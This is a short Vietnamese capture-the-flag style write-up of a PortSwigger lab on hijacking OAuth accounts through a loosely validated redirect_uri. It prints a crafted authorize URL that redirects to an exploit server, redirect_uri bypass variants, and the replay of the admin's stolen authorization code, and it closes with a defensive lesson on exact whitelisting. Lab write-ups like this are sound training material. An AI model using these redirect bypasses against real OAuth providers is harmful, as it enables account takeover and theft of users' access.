![[oauth-redirect.png]]
-mô tả lab: OAuth provider check `redirect_uri` ẩu. Mình sửa nó thành domain mình để cướp authorization code của admin, rồi dùng code đó login vào admin.

> [!NOTE]
> -Lab: https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri

### hướng giải
- [ ] mình bấm login social, quan sát URL authorize, mình thấy `redirect_uri=https://CLIENT/oauth-callback`
- [ ] mình thử sửa thành `https://exploit-.../`, mình thấy provider vẫn chịu (chỉ check chứa domain? path ẩu?)
- [ ] => mình dựng URL authorize với `redirect_uri` về server mình, dụ admin click. Admin login xong thì code của admin bay về log mình. Mình dùng code đó GET callback là vào admin.

### giải
-bước 1: mình tạo URL độc:
```
https://oauth-LAB.oauth-server.net/authorize?
client_id=CLIENT_ID
&redirect_uri=https://exploit-LAB.exploit-server.net/exploit
&response_type=code&scope=email
```
![[oauth-redirect-evil.png]]
-mình thử các biến thể tới khi provider chịu: thêm path (`.../oauth-callback/../evil`), subdomain (`client.exploit...`), query (`?x=.../oauth-callback`). Lab này ăn 1 trong các trò whitelist ẩu đó.

-bước 2: mình gửi link cho admin qua exploit-server (`Deliver exploit`), admin click + login -> provider redirect về:
```
GET /exploit?code=CODE_CUA_ADMIN
```
-sau khi quan sát log này, mình thấy code của admin. Mình phải dùng ngay vì code sống ngắn + 1 lần.

-bước 3: mình dùng session mình GET:
```
GET https://CLIENT/oauth-callback?code=CODE_CUA_ADMIN
-> 302 /my-account?id=administrator
```
-> là solve lab.

> [!NOTE]
> -bài học của mình: `redirect_uri` phải whitelist tuyệt đối scheme+host+path. Lệch 1 ký tự cũng không cho. Code thì 1 lần + hạn vài phút.
